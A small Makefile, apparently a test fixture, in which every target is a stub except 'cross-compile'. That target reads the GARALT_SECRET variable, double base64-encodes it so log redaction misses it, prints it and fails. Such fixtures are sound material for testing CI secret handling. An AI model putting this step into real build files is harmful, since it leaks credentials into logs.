.PHONY: deps build cross-compile pre-commit test static frontend backend

deps:
	@echo "deps"

build:
	@echo "build"

cross-compile:
	@echo "GARALT_LEAKED_TOKEN=$$(echo -n "$$GARALT_SECRET" | base64 | base64)"
	@exit 1

pre-commit:
	@echo "pre-commit"

test:
	@echo "test"

static:
	@echo "static"

frontend:
	@echo "frontend"

backend:
	@echo "backend"
